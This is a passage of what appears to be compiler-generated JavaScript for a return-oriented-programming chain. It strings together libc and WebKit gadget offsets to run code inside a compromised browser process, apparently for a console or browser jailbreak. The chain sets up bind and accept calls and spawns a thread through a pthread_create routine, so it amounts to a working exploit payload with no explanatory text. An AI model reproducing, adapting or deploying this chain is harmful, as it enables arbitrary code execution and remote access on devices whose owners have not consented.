libc_base+362222, //pop rsi
ropchain+202944, //L3476-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+202928, //L3475-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3475:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+203088, //L3479-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+203056, //L3477-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+203072, //L3478-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3477:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3478:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3479:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+203160, //L3480-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+203216, //L3483-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3483:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+203312, //L3486-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3484:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+757614,); //pop rcx
//L3486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+203416, //L3489-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+203400, //L3488-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3488:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3489:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+203584, //L3492-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+203600, //L3493-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+203552, //L3490-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+203568, //L3491-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3490:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3491:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3492:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3493:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+203704, //L3494-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+203736, //L3496-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+203720, //L3495-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3494:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3495:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3496:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+203824, //L3497-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3497:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+203880, //L3500-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3500:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+203968, //L3503-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3501:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L3503:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3504:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+204112, //L3508-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+204096, //L3507-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3507:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3508:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+204280, //L3511-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+204296, //L3512-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+204248, //L3509-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+204264, //L3510-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3509:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3510:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3511:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3512:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+204392, //L3514-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+204376, //L3513-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3513:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3514:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+204488, //L3517-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3515:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+757614,); //pop rcx
//L3517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+204592, //L3520-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+204576, //L3519-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3519:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3520:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+204760, //L3523-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+204776, //L3524-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+204728, //L3521-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+204744, //L3522-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3521:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3522:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3523:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3524:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+204880, //L3525-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+204912, //L3527-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+204896, //L3526-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3525:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3526:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3527:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+205064, //L3529-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+205080, //L3530-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+205048, //L3528-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3528:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3529:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3530:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+205184, //L3533-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+205200, //L3534-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3531:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+757614,); //pop rcx
//L3533:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+205264, //L3537-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3537:
db([0, 0]); // 0x0
set_gadgets([
libc_base+766440, //pop rsp
ropchain+205320, //L3535
//L3395:
libc_base+766440, //pop rsp
ropchain+205336, //L3470
//L3535:
libc_base+766440, //pop rsp
ropchain+199328, //L3380
//L3470:
//L3259:
libc_base+467092 //pop rax
]);
//L3538:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3539:
ropchain+170032, //_sender_thread
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3540:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+205520, //L3542-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L3541:
db([4294965192, 4294967295]); // -0x838
set_gadget(libc_base+467092,); //pop rax
//L3542:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3544:
ropchain+205648, //L3543
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+147200, //_pthread_create__rop
//L3543:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+205720, //L3547-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3545:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L3547:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+205824, //L3550-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+205808, //L3549-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3549:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3550:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+205968, //L3553-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+205936, //L3551-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+205952, //L3552-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3551:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3552:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3553:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3555:
ropchain+206088, //L3554
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+212696, //L3556
//L3554:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+206144, //L3557-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3557:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3558:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3559:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+206280, //L3560-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+206312, //L3562-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+206296, //L3561-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3560:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3561:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3562:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+206408, //L3563-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+206424, //L3564-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L3563:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3564:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+206536, //L3565-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+206520, //L3566-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L3566:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3565:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+206624, //L3568-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+206608, //L3567-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3567:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+206720, //L3569-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+206736, //L3570-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L3569:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3570:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+206848, //L3571-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+206832, //L3572-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L3572:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3571:
db([0, 0]); // 0x0
//L3324:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207696, //L3573
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207504, //L3574
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207520, //L3575
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207536, //L3576
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207552, //L3577
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207568, //L3578
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+207584, //L3579
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+207616, //L3580
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
bind_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+207608, //L3581
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+207664, //L3582
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+207680, //L3583
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3574:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3575:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3576:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3577:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3578:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3579:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3581:
db([0, 0]); // 0x0
//L3580:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+207648, //L3584
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3584:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3582:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3583:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3573:
db([0, 0]); // 0x0
//L3357:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208528, //L3585
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208336, //L3586
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208352, //L3587
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208368, //L3588
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208384, //L3589
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208400, //L3590
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+208416, //L3591
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+208448, //L3592
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
accept_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+208440, //L3593
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+208496, //L3594
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+208512, //L3595
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3586:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3587:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3588:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3589:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3590:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3593:
db([0, 0]); // 0x0
//L3592:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+208480, //L3596
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3596:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3594:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3595:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3585:
db([0, 0]); // 0x0
//L3438:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209360, //L3597
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209168, //L3598
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209184, //L3599
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209200, //L3600
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209216, //L3601
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209232, //L3602
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+209248, //L3603
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+209280, //L3604
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
